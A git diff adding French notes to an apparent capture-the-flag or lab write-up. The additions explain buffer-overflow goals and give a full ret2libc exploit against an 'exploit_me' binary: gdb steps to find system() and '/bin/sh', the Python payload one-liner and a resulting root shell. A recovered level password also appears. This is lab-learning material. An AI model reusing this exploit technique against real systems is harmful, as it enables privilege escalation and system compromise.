@@ -166,6 +166,7 @@ On obtient le password : 646da671ca01bb5d84dbb5fb2238dc8e
 Lien explication bufferoverflow : 
 https://defendtheweb.net/article/buffer-overflow-to-run-root-shell-full-tutorial
 https://www.coengoedegebure.com/buffer-overflow-attacks-explained/
+https://beta.hackndo.com/retour-a-la-libc/
 
 On a acces sur ce profil a un fichier exploit_me ainsi qu'un dossier mail
 Les fichiers dans le dossier Mail sont vides.
@@ -189,4 +190,40 @@ Segfault recu a l'adresse :
 OU
 - 0x30303030 in ?? () avec 145
 
+L'objectif principal d'une attaque par débordement de tampon (buffer overflow en anglais) est de compromettre la sécurité d'un programme en exploitant une vulnérabilité liée à la gestion incorrecte de la mémoire tampon. L'attaque a pour but de permettre à un attaquant d'exécuter du code malveillant ou de prendre le contrôle du programme ou du système sur lequel il s'exécute.
+
+Voici les principaux objectifs d'une attaque de débordement de tampon :
+
+Exécution de Code Malveillant : L'attaquant tente d'insérer du code malveillant dans la mémoire tampon débordée. Une fois le débordement réussi, ce code peut être exécuté, ce qui peut permettre à l'attaquant de prendre le contrôle du programme ou du système.
+
+Élévation de Privilèges : Une attaque de débordement de tampon peut être utilisée pour obtenir des privilèges supérieurs à ceux accordés à l'utilisateur ou au processus en cours. Par exemple, un attaquant peut tenter de passer d'un contexte utilisateur normal à un contexte administrateur.
+
+Nous allons chercher a executer /bin/sh avec la commande system en les rajoutant sous forme de shellcode dans la string envoye en parametre
+
+Structure des parametres : 
+[ buffer permettant d'atteindre l'overflow ] [ Adresse system() ] [ Adresse retour ] [ Adresse "/bin/sh" ]
+
+Pour obtenir l'adresse de system on lance gdb :
+gdb exploit_me
+b main
+r
+p system
+
+On recupere l'adressede system : 0xb7e6b060
+
+En suite on peut recuperer l'adresse de /bin/sh via cette commande :
+find __libc_start_main,+99999999,"/bin/sh"
+OU
+info proc map
+Cela nous affiche une liste de plage d'adresse. On cible un interval d'adresse au niveau de la libc pour chercher /bin/sh
+On tape la commande find [adresse debut],[adresse fin],"/bin/sh"
+
+Dans les deux cas on obtient l'adresse : 0xb7f8cc58
+
+La commande finale est :
+./exploit_me `python -c 'print("0" * 140 + "\x60\xb0\xe6\xb7" + "OSEF" + "\x58\xcc\xf8\xb7")'`
+Cela nous ouvre un shell
+On peut taper la commande whoami pour voir si on est root :
+# whoami
+root
 
